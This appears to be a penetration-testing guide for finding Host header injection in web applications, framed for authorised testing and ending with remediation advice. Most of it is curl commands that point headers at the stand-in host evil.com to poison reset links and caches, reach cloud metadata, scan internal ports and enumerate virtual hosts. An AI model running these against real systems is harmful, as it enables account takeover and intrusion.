---
name: testing-for-host-header-injection
description: Test web applications for HTTP Host header injection vulnerabilities to identify password reset poisoning, web cache poisoning, SSRF, and virtual host routing manipulation risks.
domain: cybersecurity
subdomain: web-application-security
tags: [host-header-injection, password-reset-poisoning, cache-poisoning, virtual-host, web-security, header-manipulation, ssrf]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Testing for Host Header Injection

## When to Use
- When testing password reset functionality for token theft via host manipulation
- During assessment of web caching behavior influenced by Host header values
- When testing virtual host routing and server-side request processing
- During penetration testing of applications behind reverse proxies or load balancers
- When evaluating SSRF potential through Host header manipulation

## Prerequisites
- Burp Suite for intercepting and modifying Host headers
- Understanding of HTTP Host header role in virtual hosting and routing
- Knowledge of alternative host headers (X-Forwarded-Host, X-Host, X-Original-URL)
- Access to an attacker-controlled domain for receiving poisoned requests
- Burp Collaborator or interact.sh for out-of-band detection
- Multiple test accounts for password reset testing

## Workflow

### Step 1 — Test Basic Host Header Injection
```bash
# Supply arbitrary Host header
curl -H "Host: evil.com" http://target.com/ -v
# Check if application reflects evil.com in response

# Double Host header
curl -H "Host: target.com" -H "Host: evil.com" http://target.com/ -v

# Host header with port injection
curl -H "Host: target.com:evil.com" http://target.com/ -v
curl -H "Host: target.com:@evil.com" http://target.com/ -v

# Absolute URL with different Host
curl --request-target "http://target.com/" -H "Host: evil.com" http://target.com/ -v

# Check for different virtual host access
curl -H "Host: admin.target.com" http://target.com/ -v
curl -H "Host: internal.target.com" http://target.com/ -v
curl -H "Host: localhost" http://target.com/ -v
```

### Step 2 — Test Password Reset Poisoning
```bash
# Trigger password reset with modified Host header
# The reset link may use the Host header value in the URL
curl -X POST http://target.com/forgot-password \
  -H "Host: evil.com" \
  -d "email=victim@target.com"
# If reset email contains: http://evil.com/reset?token=xxx
# Attacker receives the token when victim clicks the link

# Try X-Forwarded-Host for password reset poisoning
curl -X POST http://target.com/forgot-password \
  -H "X-Forwarded-Host: evil.com" \
  -d "email=victim@target.com"

# Port-based injection in reset URL
curl -X POST http://target.com/forgot-password \
  -H "Host: target.com:80@evil.com" \
  -d "email=victim@target.com"

# Test with various forwarding headers
for header in "X-Forwarded-Host" "X-Host" "X-Original-URL" "X-Rewrite-URL" "X-Forwarded-Server" "Forwarded"; do
  curl -X POST http://target.com/forgot-password \
    -H "$header: evil.com" \
    -d "email=victim@target.com"
  echo "Tested: $header"
done
```

### Step 3 — Test Web Cache Poisoning via Host Header
```bash
# If caching layer uses URL (without Host) as cache key:
# Poison cache with modified Host header
curl -H "Host: evil.com" http://target.com/ -v
# If response is cached and contains evil.com links
# All subsequent users receive poisoned content

# Test with X-Forwarded-Host for cache poisoning
curl -H "X-Forwarded-Host: evil.com" http://target.com/login -v
# Check X-Cache header to see if response was cached

# Verify cache poisoning
curl http://target.com/login -v
# If response still contains evil.com, cache is poisoned

# Poison JavaScript URLs in cached pages
curl -H "X-Forwarded-Host: evil.com" http://target.com/
# If page loads: <script src="//evil.com/static/app.js">
# Attacker serves malicious JavaScript to all users
```

### Step 4 — Test SSRF via Host Header
```bash
# Backend may use Host header to make internal requests
curl -H "Host: internal-api.target.local" http://target.com/api/proxy

# Access cloud metadata via Host header
curl -H "Host: 169.254.169.254" http://target.com/

# Internal port scanning
for port in 80 443 8080 8443 3000 5000 9200; do
  curl -H "Host: 127.0.0.1:$port" http://target.com/ -o /dev/null -w "%{http_code}" -s
  echo " - Port $port"
done

# SSRF via absolute URL
curl --request-target "http://internal-server/" -H "Host: internal-server" http://target.com/
```

### Step 5 — Test Virtual Host Enumeration
```bash
# Enumerate virtual hosts
for vhost in admin staging dev test api internal backend; do
  status=$(curl -H "Host: $vhost.target.com" http://target.com/ -o /dev/null -w "%{http_code}" -s)
  size=$(curl -H "Host: $vhost.target.com" http://target.com/ -o /dev/null -w "%{size_download}" -s)
  echo "$vhost.target.com - Status: $status, Size: $size"
done

# Check default virtual host behavior
curl -H "Host: nonexistent.target.com" http://target.com/ -v
# Compare with legitimate host response

# Access internal admin panels via virtual host
curl -H "Host: admin" http://target.com/
curl -H "Host: management.internal" http://target.com/
```

### Step 6 — Test Connection-State Attacks
```bash
# HTTP/1.1 connection reuse attack
# Send legitimate first request, then inject Host header on subsequent request
# Use Burp Repeater with "Update Content-Length" and manual Connection: keep-alive

# In Burp Repeater, send grouped request:
# Request 1 (legitimate):
# GET / HTTP/1.1
# Host: target.com
# Connection: keep-alive
#
# Request 2 (injected):
# GET /admin HTTP/1.1
# Host: internal.target.com

# Test with HTTP Request Smuggling combined
# If front-end validates Host but back-end doesn't:
# Smuggle request with modified Host header
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| Host Header | HTTP header specifying the target virtual host for the request |
| Password Reset Poisoning | Injecting Host to make reset emails contain attacker-controlled URLs |
| Cache Poisoning via Host | Poisoning CDN cache with responses containing attacker-controlled host |
| Virtual Host Routing | Web server using Host header to route requests to different applications |
| X-Forwarded-Host | Alternative header used by proxies that may override Host header |
| Connection State Attack | Exploiting persistent connections to send requests with different Host values |
| Server-Side Host Resolution | Backend code using Host header for URL generation and redirects |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP proxy for Host header manipulation and analysis |
| Burp Collaborator | Out-of-band detection for Host header SSRF |
| ffuf | Virtual host brute-forcing with custom Host headers |
| gobuster vhost | Virtual host enumeration mode |
| Nuclei | Template-based scanning for Host header injection |
| param-miner | Burp extension for discovering unkeyed Host-related headers |

## Common Scenarios

1. **Password Reset Token Theft** — Poison Host header during password reset to make victim click a link pointing to attacker server, leaking reset token
2. **Web Cache Poisoning** — Inject Host header to cache responses with attacker-controlled JavaScript URLs, achieving stored XSS for all users
3. **Internal Panel Access** — Enumerate and access internal admin panels through virtual host manipulation
4. **SSRF to Cloud Metadata** — Use Host header to redirect server-side requests to cloud metadata endpoints
5. **Routing Bypass** — Bypass access controls by manipulating Host to route requests to unprotected backend instances

## Output Format

```
## Host Header Injection Report
- **Target**: http://target.com
- **Reverse Proxy**: Nginx
- **Backend**: Apache/PHP

### Findings
| # | Technique | Header | Impact | Severity |
|---|-----------|--------|--------|----------|
| 1 | Password Reset Poisoning | Host: evil.com | Token theft | Critical |
| 2 | Cache Poisoning | X-Forwarded-Host: evil.com | Stored XSS | High |
| 3 | Virtual Host Access | Host: admin.target.com | Admin panel exposure | High |
| 4 | SSRF | Host: 169.254.169.254 | Metadata access | Critical |

### Remediation
- Validate Host header against a whitelist of expected values
- Do not use Host header for generating URLs in password reset emails
- Configure web server to reject requests with unrecognized Host values
- Set absolute URLs in application configuration instead of deriving from Host
```
